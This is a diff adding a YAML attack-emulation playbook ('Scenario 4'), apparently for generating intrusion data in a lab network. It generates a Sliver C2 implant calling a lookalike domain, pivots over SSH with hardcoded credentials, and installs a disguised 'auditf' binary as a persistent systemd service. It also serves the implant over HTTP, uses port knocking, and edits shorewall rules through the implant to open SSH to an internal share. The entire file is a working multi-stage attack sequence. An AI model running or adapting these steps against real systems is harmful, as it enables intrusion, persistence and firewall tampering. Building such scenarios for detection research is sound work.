@@ -1,0 +1,227 @@
+####################
+#
+# Scenario 4
+#
+####################
+vars:
+  $SERVER_ADDRESS: 192.42.0.254
+  $REPOSERVER_ADDRESS: 172.17.100.122
+  $ATTACKER_ADDRESS: 192.42.1.174
+  $FIREWALL_ADDRESS: 172.17.100.254
+  $LINUXSHARE_ADDRESS: 192.168.100.23
+
+
+
+commands:
+  - type: sliver
+    cmd: "generate_implant"
+    c2url: "https://faaacebook.com"
+    name: "sliver1"
+
+  - type: sliver
+    cmd: start_https_listener
+    host: 0.0.0.0
+    port: 443
+
+  - type: shell
+    cmd: sshpass -p 'rambo' scp -o StrictHostKeyChecking=no -o ProxyCommand="sshpass -p 'rambo' ssh -o StrictHostKeyChecking=no -p 10022 john@$SERVER_ADDRESS nc $FIREWALL_ADDRESS 22" /home/aecid/auditf.tar.gz john@$FIREWALL_ADDRESS:/tmp/auditf.tar.gz
+  
+  - type: ssh
+    creates_session: "foothold"
+    username: john
+    password: rambo
+    hostname: $SERVER_ADDRESS
+    port: 10022
+    cmd: id
+
+  - type: ssh
+    session: foothold
+    cmd: "ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password john@$FIREWALL_ADDRESS\n"
+    interactive: True
+  
+  - type: sleep
+    seconds: 2
+
+  - type: ssh
+    session: foothold
+    cmd: "rambo\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "sudo -i\n"
+    interactive: True
+  
+  - type: sleep
+    seconds: 2
+
+  - type: ssh
+    session: foothold
+    cmd: "rambo\n"
+    interactive: True
+  
+  - type: ssh
+    session: foothold
+    cmd: "sudo tar -xzf /tmp/auditf.tar.gz -C /usr/bin\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "rm /tmp/auditf.tar.gz\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "cd /usr/bin\n"
+    interactive: True
+
+  - type: sleep
+    seconds: 1
+
+  - type: ssh
+    session: foothold
+    cmd: "chown root:root auditf config.yaml system-verify.sh\n"
+    interactive: True
+
+  - type: sleep
+    seconds: 2
+
+  - type: ssh
+    session: foothold
+    cmd: "sudo chmod +x system-verify.sh \n"
+    interactive: True
+
+  - type: ssh
+    cmd: "vim /etc/systemd/system/auditf.service\n"
+    interactive: True
+    session: foothold
+
+  - type: ssh
+    cmd: ":inoremap jj <ESC>\n"
+    interactive: True
+    session: foothold
+
+  - type: ssh
+    cmd: "o"
+    interactive: True
+    session: foothold
+
+  - type: ssh
+    cmd: "[Unit]\nDescription=Run auditf on boot\n\n[Service]\nExecStart=/usr/bin/auditf\nWorkingDirectory=/usr/bin\nRestart=on-failure\nType=simple\n\n[Install]\nWantedBy=multi-user.target\n"
+    interactive: True
+    session: foothold
+
+  - type: ssh
+    cmd: "jj"
+    interactive: True
+    session: foothold
+
+  - type: ssh
+    cmd: ":wq!\n"
+    interactive: True
+    session: foothold
+
+  - type: sleep
+    seconds: 2
+
+  - type: ssh
+    session: foothold
+    cmd: "sudo systemctl daemon-reload\n"
+    interactive: True
+
+  - type: sleep
+    seconds: 5
+
+  - type: ssh
+    session: foothold
+    cmd: "sudo systemctl enable auditf.service\n"
+    interactive: True
+
+  - type: sleep
+    seconds: 3
+
+  - type: ssh
+    session: foothold
+    cmd: "sudo systemctl start auditf.service\n"
+    interactive: True
+
+  - type: sleep
+    seconds: 5
+
+  - type: ssh
+    session: foothold
+    cmd: "exit\n" 
+    interactive: True
+
+  - type: webserv
+    local_path: $LAST_SLIVER_IMPLANT
+    port: 8000
+    background: true
+
+  - type: sleep
+    seconds: 5
+
+  - type: shell
+    cmd: /home/aecid/knock-cli -c knock.yaml -r knock-firewall
+
+  - type: sleep
+    seconds: 5
+
+  - type: sliver-session
+    cmd: execute
+    exe: sudo
+    args: 
+      - sed 
+      - -i 
+      - '/# Kafka Ports/i\ACCEPT dmz lan:$LINUXSHARE tcp  22  -   -   -' 
+      - /etc/shorewall/rules
+    session: sliver1
+
+
+  - type: sliver-session
+    cmd: execute
+    exe: shorewall
+    args:
+      - reload
+    session: sliver1
+
+  - type: ssh
+    creates_session: "foothold2"
+    username: john
+    password: rambo
+    hostname: $SERVER_ADDRESS
+    port: 10022
+    cmd: id
+
+  - type: ssh
+    session: foothold2
+    cmd: "ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password john@$LINUXSHARE_ADDRESS\n"
+    interactive: True
+
+  - type: sleep
+    seconds: 5
+
+  - type: ssh
+    session: foothold2
+    cmd: "rambo\n"
+    interactive: True
+
+  - type: sleep
+    seconds: 1
+
+  - type: ssh
+    session: foothold2
+    cmd: "hostname\n"
+    interactive: True
+
+
+
+
+
+
+
+
+
+
+
+  
